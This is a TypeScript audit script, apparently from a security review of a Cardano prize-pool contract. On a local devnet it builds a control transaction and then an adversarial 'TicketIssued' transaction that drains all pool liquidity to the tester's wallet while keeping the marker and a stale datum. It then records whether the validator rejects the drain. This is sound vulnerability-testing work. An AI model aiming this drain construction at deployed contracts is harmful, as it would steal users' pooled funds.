/**
 * Agent A — B1 TicketIssued physical Pool Value drain characterization.
 * LOCAL YACI ONLY. Synthetic token and ephemeral test wallet.
 * Runs a positive control, then a direct B1 TicketIssued drain attempt
 * under a native test policy (not the production MintPolicy).
 */
import {
  Constr, Data, Lucid, Blockfrost, getAddressDetails, scriptFromNative,
  mintingPolicyToId, validatorToScriptHash, validatorToAddress,
  type Script, type UTxO,
} from '@lucid-evolution/lucid'
import { createHash } from 'node:crypto'
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs'
import { buildScriptsFromLucid } from '../../src/loadValidator'
import { defaultPrizeTable } from '../../src/gameRules'

const API = 'http://127.0.0.1:8080/api/v1'
const SEED = 'test test test test test test test test test test test test test test test test test test test test test test test sauce'
const PRICE = 100n
const LIQUIDITY = 400_000n
const BOOTSTRAP_ADA = 30_000_000n
const POOL_ADA = 10_000_000n
const ATTACKER_ADA = 3_000_000n
const PRIZE_ADA = 3_000_000n
const POOL_TOKEN_NAME = '504f4f4c'
const ORACLE_TOKEN_NAME = '4f5241434c45'
const ZERO32 = new Uint8Array(32)
const GAME_VERSION = Buffer.from('V1').toString('hex')
const OUT = 'audit/yaci-evidence'
const c = (index: number, fields: any[] = []): any => new Constr(index, fields)
const ref = (u: UTxO): string => u.txHash + '#' + u.outputIndex
const sortedAssets = (a: Record<string, bigint>) => Object.fromEntries(
  Object.entries(a).map(([k,v]) => [k,v.toString()] as const).sort(([x],[y]) => x.localeCompare(y)),
)
const sameAssets = (a: Record<string,bigint>, b: Record<string,bigint>) =>
  JSON.stringify(sortedAssets(a)) === JSON.stringify(sortedAssets(b))
const poolDatum = (prizeHash: string, reserve: bigint, count: bigint) =>
  c(0, [LIQUIDITY, 0n, reserve, count, 0n, 10_000n, 0n, prizeHash])
const hashJson = (v: unknown) => createHash('sha256')
  .update(JSON.stringify(v, (_k,x) => typeof x === 'bigint' ? x.toString() : x))
  .digest('hex')
const nativePolicy = (keyHash: string): Script =>
  scriptFromNative({ type: 'all', scripts: [{ type: 'sig', keyHash }] } as any)

const wallet = JSON.parse(readFileSync('/tmp/immortal-yaci-test-wallet.json','utf8')) as {
  purpose?: string; address?: string; seed?: string
}
if (wallet.purpose !== 'ephemeral-local-devnet-only' || wallet.seed !== SEED ||
    !wallet.address?.startsWith('addr_test1')) {
  throw new Error('Missing or unexpected ephemeral local-Yaci wallet manifest')
}

type Budget = { redeemer_tag: string; redeemer_index: number; ex_units: { mem: number; steps: number } }
type EvalResponse = { fault?: unknown; result?: { EvaluationResult?: Record<string,{memory:number;steps:number}> }; message?: string }
const provider = new Blockfrost(API, '') as Blockfrost & {
  evaluateTx: (tx: string, additionalUTxOs?: any[]) => Promise<Budget[]>
}
const margin = (n: number) => Number((BigInt(n) * 10_100n + 9_999n) / 10_000n)
let negativeBuild = false
let controlBudget: Budget[] | null = null
let reusedControlBudget = false
let negativeEvalError: string | null = null

async function evaluate(tx: string): Promise<Budget[]> {
  const cbor = tx.replace(/^0x/i,'')
  const response = await fetch(API + '/utils/txs/evaluate/utxos', {
    method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cbor}),
  })
  const raw = await response.text()
  let parsed: EvalResponse
  try { parsed = JSON.parse(raw) as EvalResponse } catch { parsed = {message:raw} }
  if (!response.ok || parsed.fault || !parsed.result?.EvaluationResult) {
    throw new Error('Yaci evaluation failed HTTP ' + response.status + ': ' + raw.slice(0,1800))
  }
  return Object.entries(parsed.result.EvaluationResult).map(([pointer,v]) => {
    const [redeemer_tag,index] = pointer.split(':')
    return {redeemer_tag, redeemer_index:Number(index), ex_units:{mem:margin(Number(v.memory)),steps:margin(Number(v.steps))}}
  })
}
provider.evaluateTx = async (tx) => {
  try {
    const budgets = await evaluate(tx)
    if (budgets.length !== 1 || budgets[0].redeemer_tag !== 'spend' || budgets[0].redeemer_index !== 0) {
      throw new Error('Expected one B1 Pool spending redeemer at spend:0')
    }
    controlBudget = budgets
    return budgets
  } catch (e) {
    if (!negativeBuild || !controlBudget) throw e
    reusedControlBudget = true
    negativeEvalError = e instanceof Error ? e.message : String(e)
    console.log(JSON.stringify({event:'DRAIN_NEGATIVE_REUSED_CONTROL_BUDGET',reason:negativeEvalError}))
    return controlBudget
  }
}

const tip = await (await fetch(API + '/blocks/latest')).json() as {slot:number;time:number}
if (!Number.isSafeInteger(tip.slot) || !Number.isSafeInteger(tip.time)) throw new Error('Yaci latest block missing slot/time')
const lucid = await Lucid(provider,'Preprod',{
  slotConfig:{zeroTime:tip.time*1000,zeroSlot:tip.slot,slotLength:1000},
})
lucid.selectWallet.fromSeed(wallet.seed)
const address = await lucid.wallet().address()
if (address !== wallet.address) throw new Error('Derived wallet differs from the Yaci wallet manifest')
const keyHash = getAddressDetails(address).paymentCredential?.hash
if (!keyHash) throw new Error('Test wallet has no payment key hash')

const policy = nativePolicy(keyHash)
const policyId = mintingPolicyToId(policy)
const poolUnit = policyId + POOL_TOKEN_NAME
const liquidityUnit = policyId + '5553444d'
const scripts = buildScriptsFromLucid(
  {...lucid,utils:{validatorToScriptHash,mintingPolicyToId,
    validatorToAddress:(s:Script)=>validatorToAddress('Preprod',s)}} as any,
  defaultPrizeTable,keyHash,policyId,ORACLE_TOKEN_NAME,policyId,POOL_TOKEN_NAME,
)
if (!scripts.b1PrizePoolAddress || !scripts.prizeAddress || !scripts.b1PrizePoolHash) {
  throw new Error('Failed to derive B1 validator addresses')
}
function prizeDatum(name: string, now: bigint): any {
  return c(0,[
    policyId,name,'22'.repeat(32),PRICE,'33'.repeat(32),GAME_VERSION,1n,0n,'','',c(0),'',0n,
    c(0,[0n,0n,Buffer.from(ZERO32).toString('hex'),GAME_VERSION]),
    c(1),'','44'.repeat(32),Buffer.from(ZERO32).toString('hex'),scripts.b1PrizePoolHash,
    now,now+86_400_000n,0n,0n,
  ])
}
mkdirSync(OUT,{recursive:true})
const now = BigInt(Date.now())
const bootstrap = await lucid.newTx()
  .mintAssets({[poolUnit]:1n,[liquidityUnit]:LIQUIDITY},Data.void())
  .attach.MintingPolicy(policy)
  .pay.ToContract(scripts.b1PrizePoolAddress,
    {kind:'inline',value:Data.to(poolDatum(scripts.prizeHash,0n,0n))},
    {lovelace:BOOTSTRAP_ADA,[poolUnit]:1n,[liquidityUnit]:LIQUIDITY})
  .addSigner(address).complete({localUPLCEval:false})
const bootstrapSigned = await bootstrap.sign.withWallet().complete({localUPLCEval:false})
const bootstrapHash = await bootstrapSigned.submit()
await lucid.awaitTx(bootstrapHash)
let pools = await lucid.utxosAt(scripts.b1PrizePoolAddress)
let pool = pools.find(u => u.assets[poolUnit] === 1n)
if (!pool) throw new Error('Bootstrapped Pool UTxO not found')
const initialPoolReference = ref(pool)

// Positive control: direct B1 TicketIssued, preserving every Pool asset.
const controlName = '4147454e5441434f4e54524f4c3031'
const controlUnit = policyId + controlName
const controlInputValue = sortedAssets(pool.assets)
const controlTx = await lucid.newTx()
  .collectFrom([pool],Data.to(c(1,[PRICE])))
  .attach.SpendingValidator(scripts.b1PrizePool)
  .mintAssets({[controlUnit]:1n},Data.void()).attach.MintingPolicy(policy)
  .pay.ToContract(scripts.b1PrizePoolAddress,
    {kind:'inline',value:Data.to(poolDatum(scripts.prizeHash,PRICE,1n))},pool.assets)
  .pay.ToContract(scripts.prizeAddress,
    {kind:'inline',value:Data.to(prizeDatum(controlName,now+1n))},
    {lovelace:PRIZE_ADA,[controlUnit]:1n})
  .addSigner(address).complete({localUPLCEval:false})
const controlSigned = await controlTx.sign.withWallet().complete({localUPLCEval:false})
const controlHash = await controlSigned.submit()
await lucid.awaitTx(controlHash)
pools = await lucid.utxosAt(scripts.b1PrizePoolAddress)
const controlPool = pools.find(u => u.txHash === controlHash && u.assets[poolUnit] === 1n)
if (!controlPool || (controlPool.assets[liquidityUnit] ?? 0n) !== LIQUIDITY ||
    !sameAssets(controlPool.assets,pool.assets)) throw new Error('Positive control failed full Value preservation')
pool = controlPool

// Adversarial attempt: marker and stale accounting datum stay; all physical liquidity exits.
const drainName = '4147454e5441445241494e303032'
const drainUnit = policyId + drainName
const drainDatum = Data.to(poolDatum(scripts.prizeHash,2n*PRICE,2n))
const drainPoolValue = {lovelace:POOL_ADA,[poolUnit]:1n}
const attackerValue = {lovelace:ATTACKER_ADA,[liquidityUnit]:LIQUIDITY}
const inputValue = sortedAssets(pool.assets)
let stage = 'build'
let errorText = ''
let txHash: string | null = null
let accepted = false
try {
  negativeBuild = true
  const tx = await lucid.newTx()
    .collectFrom([pool],Data.to(c(1,[PRICE])))
    .attach.SpendingValidator(scripts.b1PrizePool)
    .mintAssets({[drainUnit]:1n},Data.void()).attach.MintingPolicy(policy)
    .pay.ToContract(scripts.b1PrizePoolAddress,{kind:'inline',value:drainDatum},drainPoolValue)
    .pay.ToAddress(address,attackerValue)
    .pay.ToContract(scripts.prizeAddress,
      {kind:'inline',value:Data.to(prizeDatum(drainName,now+2n))},
      {lovelace:PRIZE_ADA,[drainUnit]:1n})
    .addSigner(address).complete({localUPLCEval:false})
  stage = 'sign'
  const signed = await tx.sign.withWallet().complete({localUPLCEval:false})
  stage = 'submit'
  txHash = await signed.submit()
  await lucid.awaitTx(txHash)
  accepted = true
} catch (e) { errorText = e instanceof Error ? e.message : String(e) }

const after = await lucid.utxosAt(scripts.b1PrizePoolAddress)
const continuing = txHash
  ? after.find(u => u.txHash === txHash && u.assets[poolUnit] === 1n)
  : after.find(u => ref(u) === ref(pool))
const originalStillUnspent = after.some(u => ref(u) === ref(pool))
if (txHash && continuing) accepted = true
const walletUtxos = await lucid.utxosAt(address)
const walletLiquidity = walletUtxos.reduce((n,u)=>n+(u.assets[liquidityUnit]??0n),0n)
const prizeUtxos = await lucid.utxosAt(scripts.prizeAddress)
const prize = txHash ? prizeUtxos.find(u=>u.txHash===txHash && (u.assets[drainUnit]??0n)===1n) : undefined
const observedFailure = errorText + '\n' + (negativeEvalError ?? '')
const budgetFailure = /execution went over budget|execution budget|budget (?:exceeded|exhausted)|execution units? (?:limit|budget)|exceeded.{0,30}budget/i.test(observedFailure)
const scriptFailure = /PlutusFailure|PlutusV[12] script failed|failed script execution|validator failure|script failure|script failed|physical pool value changed/i.test(observedFailure)
let assertions: Record<string,boolean> = {}
let classification: string
if (accepted && continuing && prize) {
  assertions = {
    continuingPoolMarkerExactlyOne:(continuing.assets[poolUnit]??0n)===1n,
    continuingPoolLiquidityZero:(continuing.assets[liquidityUnit]??0n)===0n,
    continuingPoolValueExact:sameAssets(continuing.assets,drainPoolValue),
    walletReceivesFullLiquidity:walletLiquidity===LIQUIDITY,
    staleDatumPreserved:continuing.datum===drainDatum,
    prizeTicketOutputCreated:true,
    originalPoolConsumed:!originalStillUnspent,
  }
  classification = Object.values(assertions).every(Boolean)
    ? 'CONFIRMED_B1_TICKETISSUED_POOL_VALUE_DRAIN'
    : 'ACCEPTED_BUT_EVIDENCE_ASSERTIONS_INCOMPLETE'
} else if (!accepted && stage==='submit' && originalStillUnspent && scriptFailure && !budgetFailure) {
  classification = 'REJECTED_BY_LEDGER_SCRIPT_FAILURE'
} else {
  classification = 'INCONCLUSIVE_PRE_SUBMISSION_OR_PROVIDER_FAILURE'
}
const evidence = {
  schema:'AGENT-A-B1-TICKETISSUED-POOL-VALUE-DRAIN-v0.2',
  environment:'local-yaci-devnet-only',networkProvider:API,classification,
  scope:'B1PrizePool TicketIssued; synthetic native liquidity token; native all(sig) test ticket policy',
  exclusions:{productionMintPolicy:false,counterInput:false,treasuryReceipt:false,EEVAdmission:false,preprodOrMainnet:false,V3OrReveal:false},
  bootstrapHash,initialPoolReference,testPolicyId:policyId,poolUnit,liquidityUnit,
  liquiditySubunits:LIQUIDITY.toString(),priceSubunits:PRICE.toString(),
  positiveControl:{txHash:controlHash,fullValuePreserved:JSON.stringify(controlInputValue)===JSON.stringify(sortedAssets(controlPool.assets)),
    inputValue:controlInputValue,outputValue:sortedAssets(controlPool.assets)},
  drain:{txHash,accepted,stage,error:errorText,originalPoolInputValue:inputValue,
    intendedPoolOutputValue:sortedAssets(drainPoolValue),
    continuingPoolReference:continuing?ref(continuing):null,
    continuingPoolActualValue:continuing?sortedAssets(continuing.assets):null,
    continuingPoolDatum:continuing?.datum??null,
    walletLiquidity:walletLiquidity.toString(),prizeTicketOutputFound:Boolean(prize),
    originalPoolStillUnspent:originalStillUnspent,assertions},
  budget:{reusedControlBudgetForNegative:reusedControlBudget,negativeEvalError},
  evidenceDigest:hashJson({bootstrapHash,controlHash,txHash,accepted,stage,errorText,classification,assertions}),
}
writeFileSync(OUT+'/ticket-issued-pool-value-drain.json',JSON.stringify(evidence,null,2))
console.log(JSON.stringify({event:'AGENT_A_POOL_VALUE_DRAIN_EVIDENCE',...evidence},null,2))
if (classification==='INCONCLUSIVE_PRE_SUBMISSION_OR_PROVIDER_FAILURE') process.exitCode=2
if (classification==='ACCEPTED_BUT_EVIDENCE_ASSERTIONS_INCOMPLETE') process.exitCode=3
